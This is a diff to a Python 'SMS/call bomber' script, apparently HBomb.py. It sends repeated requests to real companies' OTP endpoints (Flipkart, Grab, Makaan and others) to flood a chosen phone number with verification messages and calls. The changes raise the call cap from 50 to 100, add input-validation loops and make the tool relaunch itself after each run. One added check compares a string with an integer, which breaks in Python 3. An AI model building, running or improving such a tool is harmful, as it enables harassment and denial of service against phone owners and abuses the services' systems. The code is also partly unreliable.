@@ -426,6 +426,7 @@ def getapi(pn, lim, cc):
 
         response = requests.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data)
         return True
+
     elif lim == 8:
         headers = {
             'Host': 'www.ref-r.com',
@@ -617,8 +618,8 @@ def getapi(pn, lim, cc):
 
         data = {
           'email': cc+pn,
-          'firstname': 'SpeedX',
-          'lastname': 'SpeedX'
+          'firstname': 'Honey',
+          'lastname': 'Pots'
         }
 
         response = requests.post('https://www.aala.com/accustomer/ajax/getOTP', headers=headers, cookies=cookies, json=data)
@@ -635,6 +636,7 @@ def getapi(pn, lim, cc):
 
         response = requests.post('https://api.grab.com/grabid/v1/phone/otp', data=data)
         return True
+
     elif lim == 100:
         rd = os.popen('curl -s -X GET "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/' +
                       pn + '?callType=otpOnCall"').read()
@@ -660,10 +662,6 @@ def getapi(pn, lim, cc):
     return False
 
 
-def remsp(num):
-    num = num.replace(' ', '')
-    num = num.replace('-', '')
-    return num
 
 
 def start(target, counter, delay, ch, cc):
@@ -727,7 +725,15 @@ def start(target, counter, delay, ch, cc):
     print('\n\nBombing Completed..')
     os.system('rm *.xxx* > /dev/null 2>&1')
     banner()
-    exit()
+    input("Press Enter run Again Hbomb Tool : ")
+    subprocess.call([sys.executable, 'HBomb.py'])
+
+
+def remsp(num):
+    num = num.replace(' ', '')
+    num = num.replace('-', '')
+    return num
+
 banner()
 print(Blue)
 try:
@@ -747,19 +753,42 @@ while True:
         tc.remove('+')
         cc = ''.join(tc)
         cc = cc.strip()
-    pn = input("Enter Target Number: +" + cc + " ")
+    while not cc.isdigit():
+        cc = input('\nInvalid Country Code !!! Please Enter Again Country Code : ')
+        if '+' in cc:
+            tc = list(cc)
+            tc.remove('+')
+            cc = ''.join(tc)
+            cc = cc.strip()
+            pass    
+    while len(cc) < 1 :
+        cc = input('\nInvalid Country Code !!! Please Enter Again Country Code : ')
+        if '+' in cc:
+            tc = list(cc)
+            tc.remove('+')
+            cc = ''.join(tc)
+            cc = cc.strip()
+
+    while len(cc) > 3 :
+        cc = input('\nInvalid Country Code !!! Please Enter Again Country Code : ')
+        if '+' in cc:
+            tc = list(cc)
+            tc.remove('+')
+            cc = ''.join(tc)
+            cc = cc.strip()
+    pn = input("\nEnter Target Number: +" + cc + " ")
+    while not  pn.isdigit() :
+        pn = input("\nInvalid Number Please Enter Again Target Number: +" + cc + " ")
+        pass
+    while len(pn) < 7 :
+        pn = input("\nInvalid Number Please Enter Again Target Number: +" + cc + " ")
+        pass
+    while len(pn) > 13 :
+        pn = input("\nInvalid Number Please Enter Again Target Number: +" + cc + " ")
+        pass
     pn = remsp(pn)
-    if len(cc) >= 4 or len(cc) < 1:
-        print('\nInvalid Country Code..( Country Codes Are Generally 1-3 digits...)')
-        continue
-    if len(pn) <= 6:
-        print('\nInvalid Phone Number..')
-        continue
-    for cch in str(cc + pn):
-        if not cch.isdigit():
-            print('Phone Number Must Consist Of Numbers Only\n')
-            continue
     break
+
 type = 0
 try:
     if sys.argv[1] == "call":
@@ -767,27 +796,46 @@ try:
 except Exception:
     type = 0
 if type == 1:
-    nm = int(input("Enter Number of Calls To Send(Maximum 50): "))
-    if nm > 50:
+    nm = input("Enter Number of Calls To Send(Maximum 100): ")
+    while not nm.isdigit() :
+        nm = input("Invalid Number !!! Enter Number of Calls To Send(Maximum 100): ")
+        pass
+    if nm > 100:
         print("\t\tYou Have Entered " + str(nm) +
-              ".\n\tNormalizing Value To 50")
-        nm = 50
-    dl = float(input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
+              ".\n\tNormalizing Value To 100")
+        nm = 100
+    dl = input("Enter Delay time (in seconds) [Recommended 10 sec ] : ")
+    while not dl.isdigit():
+        dl = input("Invalid !!! Enter Delay time (in seconds) [Recommended 10 sec ] : ")
+        pass
+
 elif type == 0:
     if cc == "91":
-        nm = int(input("Enter Number of Messages To Send(0 For Unlimited): "))
-        dl = float(
-            input("Enter Delay time (in seconds) [Recommended 2 sec ] : "))
+        nm = input("Enter Number of Messages To Send : ")
+        while not nm.isdigit() :
+            nm = input("Invalid Number !!! Enter Number of Messages To Send : ")
+            pass
+        dl = input("Enter Delay time (in seconds) [Recommended 2 sec ] : ")
+        while not dl.isdigit():
+            dl = input("Invalid !!! Enter Delay time (in seconds) [Recommended 2 sec ] : ")
+            pass
     else:
-        nm = int(input("Enter Number of Messages To Send: "))
-        dl = float(
-            input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
+        nm = input("Enter Number of Messages To Send: ")
+        while not nm.isdigit():
+            nm = input("Invalid Number !!! Enter Number of Messages To Send : ")
+            pass
+        dl = input("Enter Delay time (in seconds) [Recommended 10 sec ] : ")
+        while not dl.isdigit():
+            dl = input("Invalid !!! Enter Delay time (in seconds) [Recommended 10 sec ] : ")
+            pass
 maxlim = 0
+nm = int(nm)
+dl = float(dl)
 if cc == "91":
     maxlim = 500
 else:
     maxlim = 100
-if nm > maxlim:
+if int(nm) > maxlim:
     print('\n\n\tSorry Due To Misuse Of This Script We Only Provide ' +
           str(maxlim) + ' SMS At Once...\n\n')
     print('Number Of SMS Has been Set To ' + str(maxlim))
